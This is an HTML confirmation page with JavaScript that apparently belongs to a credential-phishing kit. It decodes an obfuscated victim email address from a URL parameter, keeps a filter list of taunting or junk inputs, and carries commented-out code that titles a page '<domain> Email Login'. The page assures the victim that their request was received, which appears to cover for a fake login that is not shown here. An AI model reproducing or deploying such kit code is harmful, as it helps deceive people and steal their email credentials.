<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700,900&amp;display=swap" rel="stylesheet">
  </head>
    <style>
      body {
        text-align: center;
        padding: 40px 0;
        background: #EBF0F5;
      }
        h1 {
          color: #88B04B;
          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
          font-weight: 900;
          font-size: 40px;
          margin-bottom: 10px;
        }
        p {
          color: #404F5E;
          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
          font-size:20px;
          margin: 0;
        }
      i {
        color: #9ABC66;
        font-size: 100px;
        line-height: 200px;
        margin-left:-15px;
      }
      .card {
        background: white;
        padding: 60px;
        border-radius: 4px;
        box-shadow: 0 2px 3px #C8D0D8;
        display: inline-block;
        margin: 0 auto;
      }
      .btn{
        border-radius: 7px;
        color: white;
        background-color: #88b04b;
        padding: 9px;    
        cursor: pointer;          
      }

      .btn:hover{
        background-color: #769449;
      }
    </style>
    <body>
      <div class="card">
      <div style="border-radius:200px; height:200px; width:200px; background: #F8FAF5; margin:0 auto;">
        <i class="checkmark">✓</i>
      </div>
        <h1>Success</h1> 
        <p>We received your request;<br/> This your Tansaction id : <b><span id="mycode"></span></b> <br/> we'll be in touch shortly!</p><br>
        <p>Click here to <a style="text-decoration: none!important;" href="index.html" ><span class="btn" >Continue</span></a></p>
      </div>
	  
	  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">

var $c = getUrlParameter('code');
     
	$('#mycode').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 
	  
    </body>


</html>